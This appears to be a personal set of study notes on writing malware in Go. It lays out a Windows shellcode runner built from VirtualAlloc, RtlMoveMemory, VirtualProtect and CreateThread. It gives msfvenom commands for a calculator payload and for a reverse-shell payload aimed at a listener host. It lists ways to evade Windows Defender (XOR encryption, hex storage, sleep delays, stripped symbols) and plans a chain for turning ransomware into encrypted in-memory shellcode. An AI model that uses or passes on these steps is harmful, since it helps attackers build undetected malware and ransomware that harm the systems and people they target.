==========GOLANG MALWARE DEVELOPMENT==============
- Starting with simple shellcode runner then advanced techniques such as
EDR bypasss.
- Display in go
fmt.Println()
fmt.Prinf()
- To set up a go project
	cmd>> go mod init <folder_name>
- To run the code:
	cmd>> go run .
- Stand alone exe:
	cmd>> go build .
NOTE: Unlike in other languages Go will figure out all dependancies and 
packages used. No need to download them separately(like in python)

----External Managed packates----------
- Create a virtual env
	cmd>> go mod init msgbox
- Download package in our case lets do a win32 API
	cmd>>go get golang.org/x/sys/windows


===================WIndows API(MsgBox from Go)============
- Win32 API is a collection of functions, procedures, and protocols provided
by ms windows to allow software apps to interact with the underlying system
components.
- To interact with the API we will use windows package

PROS:
1. Easy to use
2. No need to translate between C and Go data types
3. IntelliSense(Vs Code) will show every args needed when package is imported

CONS
1. Not every Windows API is included in this package.

-------- Syscall Package-------------
- The syscall package is harder to  use but more powerful
PROS:
1. Call any function from any DLL
CONS:
1. No intelliSense
2. Manually convert windows 


===================ShellCode Runner============================
- Shellcode small piece of machine code used in context of malicious
activities. Provides CLI when executed to an attacker.
- Required API Calls:
1. VirtualAlloc
2. RtlMoveMemory
3. VirtualProtect(optional)
4.CreateThread
5. WaitForSingleObject
- To generate shellcode we use msfvenom/Donut. Payload will be flaged
- The shellcode will pop a calculator
	kali> msfvenom  -f hex -p windows/x64/exec cmd=calc   
* -f is the output format i.e hex characters in string
* -p this the actual payload
* cmd=calc  -the command to run. Calculator

-------------Transform the Shellcode from string to byte array-------------
- The shellcode in a string format is not useful to us. Turn it to byte array
NOTE: Storing SHell code as a hex string helps evading static AV signatures(sometimes)
-------------Memory Allocation-------------------------------
- Next we allocate memory to our shellcode
- We will use VirualAlloc API.
-------------Copy shellcode-----------------------
-Rt1MoveMemory will write the shellcode bytes into memory.
- Sunce the Rt1MoveMemory is not part of the package we will use  syscall.
--------------Memory Permission to Rx------------------
We have to change permisions to RX other wise our program will crash when trying
to start a thread from that memory region.
- Use VirtualProtect API
--------------Create a New Thread---------------------
-Finally create a new thread pointing to our shellcode.
- Then wait for the API to finish

NOTE: Write the Ransomaware, use donut to turn it into shellcode---> turn to a string---> encrypt the string using XOR---> Only decrypt in memory---> AFter sleep


=============Bypassing Windows defender====================
- Generated shell code using:
    kali>  msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.106 LPORT=4444 --arch x64 -f c

âœ… Multi-Layer Evasion:
Hex String Storage - Bypassed static signature detection

XOR Encryption - Obfuscated payload in memory

Time Delays - Defeated sandbox analysis

Linker Obfuscation (-s -w) - Removed debug symbols

Runtime Decryption - Payload only exists in memory during execution
-COmpiling the final runner:
	cmd>> go build -ldflags="-s -w" -o shellcode_runner.exe main.go
----------------------More Info--------------------------------------
Keep your XOR keys unique for each build

Rotate your shellcode regularly

Test against multiple AV engines

Consider network-based evasion (domain generation, protocol mimicking)
